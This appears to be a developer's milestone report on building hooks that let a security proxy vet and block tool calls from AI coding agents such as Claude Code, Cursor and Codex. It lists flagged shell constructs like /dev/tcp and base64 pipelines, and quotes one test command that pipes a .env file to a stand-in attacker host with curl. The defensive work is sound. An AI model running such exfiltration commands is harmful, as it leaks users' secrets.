# v0.4 M6 report: hooks for native client tools

Lane B (Command Code). Built on `lane-b/v0.4`, merged into `v0.4`.

## 1. Features built

- `packages/core/src/hooks.ts`: `palizade hook` core. `normalizeNativeEvent` maps each client's hook JSON to a synthetic `tools/call` request/response pair, and `evaluateHookEvent` runs it through the real `InterceptionEngine` with a synthetic `native-tools` server (tool classes/capabilities/argument roles for Bash, Shell, Write, Edit, apply_patch, WebFetch, Read, Grep, Glob). The same SQLite taint store, policy, and audit files as the proxy are used; taint scope is keyed by the client's `session_id`/`conversation_id`.
- Claude Code (verified against https://code.claude.com/docs/en/hooks): `PreToolUse` → `hookSpecificOutput.permissionDecision` allow/deny/ask; `PostToolUse` of Read/WebFetch/Grep/Glob registers taint. Bash commands get the `shell_command` role plus extracted URLs/hosts/redirect targets; Write/Edit hit critical-path rules; WebFetch URLs hit destination checks.
- Cursor (verified against https://cursor.com/docs/hooks): `beforeShellExecution`/`beforeMCPExecution` → `{ permission, user_message, agent_message }`; `afterShellExecution`/`afterMCPExecution` register taint from `output`/`result_json`; installed with `failClosed: true`.
- Codex (verified against https://developers.openai.com/codex/hooks): `PreToolUse`/`PostToolUse` covering Bash and `apply_patch`; deny via `hookSpecificOutput.permissionDecision` (the shape Codex documents).
- `analyzeShellCommand`: extracts URLs, host-like tokens after network verbs, `>`/`<` redirect targets, and suspicious constructs (`$(...)`, backticks, `eval`, base64 pipelines, `/dev/tcp`, long base64 strings). Deliberately not a shell parser.
- `require_approval` policy decisions become "ask" (the client's own approval flow decides) instead of being pre-denied.
- `palizade install-hooks <client>` (`packages/cli/src/install-hooks.ts`): merges hook entries into `~/.claude/settings.json` (exec-form `node` + args), `~/.cursor/hooks.json` (`failClosed: true`), or `~/.codex/hooks.json`; backs up first and refuses to overwrite malformed JSON; idempotent.
- Fail closed by default: `hooks.failMode: closed` — any crash, invalid stdin JSON, or timeout exits 2 (block in all three clients), never allow.

## 3. New policy condition

None. Hooks reuse the proxy's sink conditions by synthesizing `tools/call` messages (taint, destination, critical_path, quarantine, Rule of Two, limits).

## 4. Behavior changes to existing presets

None. Hooks evaluate against the operator's existing policy/presets unchanged. New behavior surface: `palizade hook` and `palizade install-hooks` commands, documented in `README.md`.

## 5. Numbers

- `pnpm bench:latency` (after M6): pass-through p50 0.11 ms / p95 0.23 ms; SQLite sink check vs 200 records p50 1.51 ms / p95 1.95 ms (limit 15 ms).
- `pnpm test`: 40 files, 182 tests passing (1 skipped, pre-existing docker test), all green.

## 6. `// shortcut:` comments

- `packages/core/src/hooks.ts`: hook evaluation opens a fresh engine + SQLite store per invocation (a hook process is one-shot); per-conversation session state is recovered via profile-scope taint and the client session id. Upgrade with a persistent hook daemon if latency matters.
- `packages/core/src/hooks.ts`: the `native-tools` server has no `tools/list`, so lockfile and annotation-based classification do not apply to native tools; class/capability mapping is the explicit table in `HOOK_SERVER`.
- `packages/core/src/hooks.ts` (`analyzeShellCommand`): host extraction only looks after known network verbs and only for the first non-flag token per pipeline segment; compound commands hide destinations.

## 7. Not verified against the spec or hook docs

All three clients' hook formats were verified against their live docs pages during this milestone. Cursor's `preToolUse`/`postToolUse` generic events are not wired (beforeShellExecution/beforeMCPExecution cover the plan's surface); Cursor's `ask` is "accepted by the schema but not enforced" per their docs, so ask-denied paths fall back to Cursor's own approval.

## 8. Skipped or partly done

- Claude Code `PermissionRequest` and `SessionStart` events are not handled (not in the milestone scope).
- The plan's `cat .env | curl -d @- evil.com` test is covered via the tainted-Read-then-curl test; `cat .env` itself is not blocked unless `.env` content is tainted or the command is suspicious.
